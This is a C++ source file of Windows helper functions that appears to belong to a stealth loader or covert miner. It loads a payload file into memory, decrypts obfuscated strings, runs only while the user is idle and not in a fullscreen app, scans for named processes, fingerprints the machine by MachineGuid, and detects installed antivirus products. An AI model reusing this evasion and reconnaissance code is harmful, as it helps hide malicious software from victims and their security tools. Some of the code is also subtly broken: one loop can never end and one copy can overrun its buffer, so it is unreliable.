#include "../include/util.h"
#include "../include/process_info.h"
#include "../include/encryption.h"
#include <iostream>
#include <sys/types.h>
#include <signal.h>
#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <chrono>
#include <unordered_map>
#include <algorithm>
#include <chrono>
#include <wbemidl.h>
#include <comdef.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")


BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
{
    HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if(file == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        std::cerr << "Could not open file!" << std::endl;
#endif
        return nullptr;
    }
    HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
    if (!mapping) {
#ifdef _DEBUG
        std::cerr << "Could not create mapping!" << std::endl;
#endif
        CloseHandle(file);
        return nullptr;
    }
    BYTE *dllRawData = (BYTE*) MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (dllRawData == nullptr) {
#ifdef _DEBUG
        std::cerr << "Could not map view of file" << std::endl;
#endif
        CloseHandle(mapping);
        CloseHandle(file);
        return nullptr;
    }
    r_size = GetFileSize(file, 0);
    BYTE* localCopyAddress = (BYTE*) VirtualAlloc(NULL, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (localCopyAddress == NULL) {
        std::cerr << "Could not allocate memory in the current process" << std::endl;
        return nullptr;
    }
    memcpy(localCopyAddress, dllRawData, r_size);
    UnmapViewOfFile(dllRawData);
    CloseHandle(mapping);
    CloseHandle(file);
    return localCopyAddress;
}

void free_buffer(BYTE* buffer)
{
    if (buffer == NULL) return;
    VirtualFree(buffer, 0, MEM_RELEASE);
}

wchar_t* get_file_name(wchar_t *full_path)
{
    size_t len = wcslen(full_path);
    for (size_t i = len - 2; i >= 0; i--) {
        if (full_path[i] == '\\' || full_path[i] == '/') {
            return full_path + (i + 1);
        }
    }
    return full_path;
}


std::string GetWindowsUsername() {
    const DWORD MAX_USERNAME_LENGTH = 256;
    char username[MAX_USERNAME_LENGTH];
    DWORD size = MAX_USERNAME_LENGTH;
    
    if (!GetUserNameA(username, &size)) {
        std::cerr << "Error getting username. Code: " << GetLastError() << std::endl;
        return DecryptString(__ENCRYPTED_10__);
    }

    std::string result(username, size - 1);
    std::replace(result.begin(), result.end(), ' ', '-');
    
    return result;
}

int GetSystemUptimeMinutes() {
    #ifdef _WIN32
    ULONGLONG uptimeMs = GetTickCount64();
    #else
    // For Linux/Unix: use system uptime via /proc/uptime or clock_gettime
    auto now = std::chrono::steady_clock::now();
    auto duration = now.time_since_epoch();
    ULONGLONG uptimeMs = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
    #endif
    int uptimeMinutes = (int)(uptimeMs / (1000 * 60));
    return uptimeMinutes;
}

wchar_t* get_directory(IN wchar_t *full_path, OUT wchar_t *out_buf, IN const size_t out_buf_size)
{
    memset(out_buf, 0, out_buf_size);
    memcpy(out_buf, full_path, out_buf_size);

    wchar_t *name_ptr = get_file_name(out_buf);
    if (name_ptr != nullptr) {
        *name_ptr = '\0'; //cut it
    }
    return out_buf;
}


bool IsPidRunning(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        return false; // Process doesn't exist or access denied
    }

    DWORD exitCode;
    if (GetExitCodeProcess(hProcess, &exitCode)) {
        CloseHandle(hProcess);
        return (exitCode == STILL_ACTIVE); // Returns true if still running
    }

    CloseHandle(hProcess);
    return false;
}


bool AreProcessesRunning(const std::vector<std::string>& processNames) {
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    
    // Take a snapshot of all processes in the system
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Set the size of the structure before using it
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    // Retrieve information about the first process
    if (!Process32FirstW(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap); // clean the snapshot object
        return false;
    }
    
    // Setup converter from wide char to UTF-8
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
    
    // Walk through the process list
    do {
        // Convert the wide char process name to UTF-8 string
        std::string currentProcess = converter.to_bytes(pe32.szExeFile);
        std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), ::tolower);
        
        // Check against each process in our list
        for (const auto& targetProcess : processNames) {
            std::string targetLower = targetProcess;
            std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::tolower);
            
            // If we find a match, return true
            if (currentProcess.find(targetLower) != std::string::npos) {
                CloseHandle(hProcessSnap);
                return true;
            }
        }
    } while (Process32NextW(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);
    return false;
}


// Convert std::string to LPWSTR
LPWSTR StringToLPWSTR(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    wchar_t* wstr = new wchar_t[size_needed + 1];
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), wstr, size_needed);
    wstr[size_needed] = 0;
    return wstr;
}

std::string buildCommandFromTemplate(
    const std::string& template_str,
    const std::unordered_map<std::string, std::string>& replacements
) {
    std::string result = template_str;
    
    for (const auto& [placeholder, value] : replacements) {
        size_t pos = result.find(placeholder);
        if (pos != std::string::npos) {
            result.replace(pos, placeholder.length(), value);
        }
    }
    
    return result;
}

bool IsDeviceIdle(int minutes) {
    // Get the last input time in milliseconds
    LASTINPUTINFO lastInputInfo;
    lastInputInfo.cbSize = sizeof(LASTINPUTINFO);
    
    if (!GetLastInputInfo(&lastInputInfo)) {
        std::cerr << "Failed to get last input info. Error: " << GetLastError() << std::endl;
        return false; // Assume not idle if we can't determine
    }

    // Calculate idle time in milliseconds
    DWORD currentTickCount = GetTickCount();
    DWORD idleTimeMs = currentTickCount - lastInputInfo.dwTime;

    // Convert minutes to milliseconds
    auto thresholdMs = std::chrono::minutes(minutes).count() * 60 * 1000;
    
    bool isIdle = (idleTimeMs >= thresholdMs);
    
    std::cout << "[IDLE_CHECK] Idle time: " << (idleTimeMs / 1000 / 60) << "m " << ((idleTimeMs / 1000) % 60) << "s, Threshold: " << minutes << "m, IsIdle: " << (isIdle ? "YES" : "NO") << std::endl;
    std::cout.flush();

    return isIdle;
}

bool IsForegroundWindowFullscreen() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;

    // Get window style to exclude certain windows
    LONG style = GetWindowLong(hwnd, GWL_STYLE);
    if (style & WS_CHILD) return false; // Ignore child windows

    RECT windowRect;
    GetWindowRect(hwnd, &windowRect);

    // Get the monitor where the window is located
    HMONITOR hMonitor = MonitorFromWindow(hwnd, MONITOR_DEFAULTTONEAREST);
    if (!hMonitor) return false;

    MONITORINFO monitorInfo;
    monitorInfo.cbSize = sizeof(monitorInfo);
    if (!GetMonitorInfo(hMonitor, &monitorInfo)) return false;

    // Check if window covers the entire monitor
    return (windowRect.left <= monitorInfo.rcMonitor.left &&
            windowRect.top <= monitorInfo.rcMonitor.top &&
            windowRect.right >= monitorInfo.rcMonitor.right &&
            windowRect.bottom >= monitorInfo.rcMonitor.bottom);
}



bool IsAnotherInstanceRunning(const char* mutexName) {
    HANDLE hMutex = CreateMutexA(
        NULL,           // Default security attributes
        TRUE,           // Initially owned
        mutexName);     // Unique mutex name (ANSI version)

    if (hMutex == NULL) {
        std::cerr << "CreateMutex error: " << GetLastError() << std::endl;
        return true; // Assume another instance is running to be safe
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
        return true;
    }

    // Mutex is held; release it when the program exits
    return false;
}

std::string GetCPUName() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 
        0, KEY_READ, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return "Unknown";
    }

    char cpuName[256] = {0};
    DWORD size = sizeof(cpuName);
    result = RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &size);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        return std::string(cpuName);
    }
    return "Unknown";
}

std::string GetGPUName() {
    // Try WMI first for better detection
    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        // Fall back to registry if WMI initialization fails
        goto registry_fallback;
    }

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
                               RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        goto registry_fallback;
    }

    {
        IWbemLocator *pLoc = NULL;
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                               IID_IWbemLocator, (LPVOID *)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            goto registry_fallback;
        }

        IWbemServices *pSvc = NULL;
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        IEnumWbemClassObject *pEnumerator = NULL;
        hres = pSvc->ExecQuery(_bstr_t(L"WQL"), _bstr_t(L"SELECT Name FROM Win32_VideoController"),
                              WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        IWbemClassObject *pclsObj = NULL;
        ULONG uReturn = 0;
        std::string gpuName = "Unknown";
        
        while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK && uReturn > 0) {
            VARIANT vtProp;
            VariantInit(&vtProp);
            
            HRESULT hresGet = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hresGet) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
                // Successfully got the Name property
                size_t len = wcslen(vtProp.bstrVal) + 1;
                char* gpuNameA = new char[len];
                
                if (wcstombs_s(nullptr, gpuNameA, len, vtProp.bstrVal, _TRUNCATE) == 0) {
                    gpuName = std::string(gpuNameA);
                    
                    // Trim whitespace
                    size_t start = gpuName.find_first_not_of(" \t\r\n");
                    if (start != std::string::npos) {
                        gpuName = gpuName.substr(start);
                    }
                    size_t end = gpuName.find_last_not_of(" \t\r\n");
                    if (end != std::string::npos) {
                        gpuName = gpuName.substr(0, end + 1);
                    }
                    
                    // If we got a valid name, break and return it
                    if (!gpuName.empty() && gpuName != "Unknown") {
                        delete[] gpuNameA;
                        VariantClear(&vtProp);
                        pclsObj->Release();
                        break;
                    }
                }
                delete[] gpuNameA;
            }
            
            VariantClear(&vtProp);
            pclsObj->Release();
        }
        
        if (gpuName != "Unknown") {
            pEnumerator->Release();
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return gpuName;
        }

        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }

registry_fallback:
    // Fallback to registry if WMI fails
    HKEY hKey = NULL;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return "Unknown";
    }

    std::string gpuName = "Unknown";
    DWORD index = 0;
    wchar_t subkeyName[256] = {0};
    DWORD subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);

    // Enumerate subkeys
    while (RegEnumKeyExW(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        HKEY hSubKey = NULL;
        
        // Open subkey
        if (RegOpenKeyExW(hKey, subkeyName, 0, KEY_QUERY_VALUE, &hSubKey) == ERROR_SUCCESS) {
            wchar_t providerName[512] = {0};
            DWORD size = sizeof(providerName);
            
            // Query ProviderName value
            if (RegQueryValueExW(hSubKey, L"ProviderName", NULL, NULL, (LPBYTE)providerName, &size) == ERROR_SUCCESS) {
                // Check for NVIDIA, AMD, ATI, Intel
                if (wcsstr(providerName, L"NVIDIA") != NULL ||
                    wcsstr(providerName, L"AMD") != NULL ||
                    wcsstr(providerName, L"ATI") != NULL ||
                    wcsstr(providerName, L"Advanced Micro Devices") != NULL ||
                    wcsstr(providerName, L"Intel") != NULL) {
                    
                    // Try to get device description
                    wchar_t deviceDesc[512] = {0};
                    DWORD descSize = sizeof(deviceDesc);
                    
                    if (RegQueryValueExW(hSubKey, L"DeviceDesc", NULL, NULL, (LPBYTE)deviceDesc, &descSize) == ERROR_SUCCESS) {
                        // Extract just the device name (after the semicolon if present)
                        wchar_t* deviceName = deviceDesc;
                        wchar_t* semicolon = wcschr(deviceDesc, L';');
                        if (semicolon != NULL) {
                            deviceName = semicolon + 1;
                        }
                        
                        // Convert to string and trim whitespace
                        char gpuNameA[512];
                        wcstombs_s(nullptr, gpuNameA, sizeof(gpuNameA), deviceName, _TRUNCATE);
                        gpuName = std::string(gpuNameA);
                        
                        // Trim leading and trailing whitespace
                        size_t start = gpuName.find_first_not_of(" \t");
                        if (start != std::string::npos) {
                            gpuName = gpuName.substr(start);
                        }
                        size_t end = gpuName.find_last_not_of(" \t");
                        if (end != std::string::npos) {
                            gpuName = gpuName.substr(0, end + 1);
                        }
                        
                        RegCloseKey(hSubKey);
                        RegCloseKey(hKey);
                        return gpuName;
                    }
                }
            }
            
            RegCloseKey(hSubKey);
        }
        
        index++;
        subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
    }

    RegCloseKey(hKey);
    return gpuName;
}

std::string GetComputerHash() {
    // Create a hash based on machine GUID and username
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Microsoft\\Cryptography", 
        0, KEY_READ, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return "unknown";
    }

    char machineGuid[256] = {0};
    DWORD size = sizeof(machineGuid);
    result = RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)machineGuid, &size);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        return std::string(machineGuid);
    }
    return "unknown";
}

std::string GetAntivirusName() {
    // Check Windows Defender first
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender",
        0, KEY_READ, &hKey);
    
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return "Windows Defender";
    }

    // Check for third-party antivirus via WMI
    // Using registry path that lists installed antivirus products
    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, KEY_READ, &hKey);
    
    if (result == ERROR_SUCCESS) {
        char antivirus[256] = {0};
        DWORD size = sizeof(antivirus);
        
        // Check for common antivirus products
        const char* antivirusNames[] = {
            "Norton", "McAfee", "Kaspersky", "AVG", "Avast",
            "Bitdefender", "F-Secure", "ESET", "Trend Micro", "Symantec"
        };
        
        DWORD index = 0;
        char subkeyName[256];
        DWORD subkeyNameSize = sizeof(subkeyName);
        
        while (RegEnumKeyExA(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            for (const char* av : antivirusNames) {
                if (strstr(subkeyName, av) != nullptr) {
                    RegCloseKey(hKey);
                    return std::string(av);
                }
            }
            index++;
            subkeyNameSize = sizeof(subkeyName);
        }
        
        RegCloseKey(hKey);
    }
    
    return "Unknown";
}